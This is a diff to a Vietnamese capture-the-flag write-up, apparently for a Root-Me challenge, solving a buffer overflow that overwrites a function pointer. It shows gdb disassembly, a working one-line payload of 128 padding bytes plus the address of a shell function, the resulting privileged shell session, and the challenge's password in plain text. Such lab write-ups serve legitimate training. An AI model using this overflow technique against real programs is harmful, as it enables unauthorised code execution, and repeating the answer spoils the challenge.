@@ -113,4 +113,63 @@ End of assembler dump.
 Ta thấy sau khi gọi hàm fgets tại địa chỉ 0x080485c6 thì nó tiếp tục gọi hàm func() là con trỏ hàm được lưu trong thanh ghi eax, do đó ta sẽ tìm địa chỉ hàm shell để thay thế vào thanh ghi này bằng cách disass shell
 
 ![image](https://user-images.githubusercontent.com/64201705/119268337-ae0b1480-bc1c-11eb-8892-cec5781bc9ad.png)
+```Bash
+(gdb) disass shell
+Dump of assembler code for function shell:
+   0x08048516 <+0>:     push   %ebp
+   0x08048517 <+1>:     mov    %esp,%ebp
+   0x08048519 <+3>:     push   %esi
+   0x0804851a <+4>:     push   %ebx
+   0x0804851b <+5>:     call   0x8048450 <__x86.get_pc_thunk.bx>
+   0x08048520 <+10>:    add    $0x1ae0,%ebx
+   0x08048526 <+16>:    call   0x80483a0 <geteuid@plt>
+   0x0804852b <+21>:    mov    %eax,%esi
+   0x0804852d <+23>:    call   0x80483a0 <geteuid@plt>
+   0x08048532 <+28>:    sub    $0x8,%esp
+   0x08048535 <+31>:    push   %esi
+   0x08048536 <+32>:    push   %eax
+   0x08048537 <+33>:    call   0x80483d0 <setreuid@plt>
+   0x0804853c <+38>:    add    $0x10,%esp
+   0x0804853f <+41>:    sub    $0xc,%esp
+   0x08048542 <+44>:    lea    -0x1990(%ebx),%eax
+   0x08048548 <+50>:    push   %eax
+   0x08048549 <+51>:    call   0x80483c0 <system@plt>
+   0x0804854e <+56>:    add    $0x10,%esp
+   0x08048551 <+59>:    nop
+   0x08048552 <+60>:    lea    -0x8(%ebp),%esp
+   0x08048555 <+63>:    pop    %ebx
+   0x08048556 <+64>:    pop    %esi
+   0x08048557 <+65>:    pop    %ebp
+   0x08048558 <+66>:    ret
+End of assembler dump.
+(gdb)
+```
+Hàm shell bắt đầu ở địa chỉ ``` 0x08048516 ``` do đó ta sẽ phải ghi giá trị này vào eax để chương trình gọi tới.
+Vậy ta sẽ dùng payload là 128 chữ A và địa chỉ này dưới dạng shellcode:
+
+```Bash 
+app-systeme-ch15@challenge02:~$ cat <(python -c "print 'A'*128+'\x16\x85\x04\x08'") - | ./ch15
+ls
+Makefile  ch15  ch15.c
+id
+uid=1215(app-systeme-ch15-cracked) gid=1115(app-systeme-ch15) groups=1115(app-systeme-ch15),100(users)
+cat ./passwd
+cat: './'$'\306''p'$'\303''asswd': No such file or directory
+cat ./passwd
+cat: ./passwd: No such file or directory
+cat passwd
+cat: passwd: No such file or directory
+cd ~
+ls
+Makefile  ch15  ch15.c
+cat .passwd
+B33r1sSoG0oD4y0urBr4iN
+```
+![image](https://user-images.githubusercontent.com/64201705/119268630-08f13b80-bc1e-11eb-8c79-68b3233f351a.png)
+
+Như vậy flag hay password là:
+
+## B33r1sSoG0oD4y0urBr4iN
+
+
 
